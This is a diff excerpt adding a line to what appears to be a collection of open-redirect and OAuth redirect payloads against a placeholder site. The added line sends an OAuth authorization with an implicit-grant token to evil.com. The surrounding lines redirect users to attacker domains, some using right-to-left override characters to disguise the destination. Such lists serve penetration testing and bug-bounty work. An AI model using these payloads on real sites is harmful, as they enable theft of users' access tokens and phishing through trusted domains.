@@ -109,6 +109,7 @@ https://target.com/redirect?url=https://evil.com?q=REST+API
 https://target.com/rossiya#login?next=///<open-redirect-url
 https://target.com/safety/unsafe_link_warning?unsafe_link=https%3A%2F%2F%E2%80%AEevil2.com
 https://target.com/safety/unsafe_link_warning?unsafe_link=https%3A%2F%2F%E2%80%AEmoc.rettiwt
+https://target.com/site/oauth2/authorize?client_id=b9jLmh8WCLZPBAwWba&redirect_uri=https%3A%2F%2Fevil.com%2Fusers%2Fauth%2Fbitbucket%2Fcallback&response_type=token&state=DoesNotMatter
 https://target.com/studio/forbidden/?message=Hi%20You%20Are%20%20Not%20%20in%20Mapbox%20Please%20Go%20%20To%20http://evil.com&redirect=/evil.com/&path=%2Fstudio%2Fadmin%2F
 https://target.com/teams/authorize?target_screen_name=&authorize_callback=//evil.com
 https://target.com/transfer_auth?key=<TOKEN>&continue=/
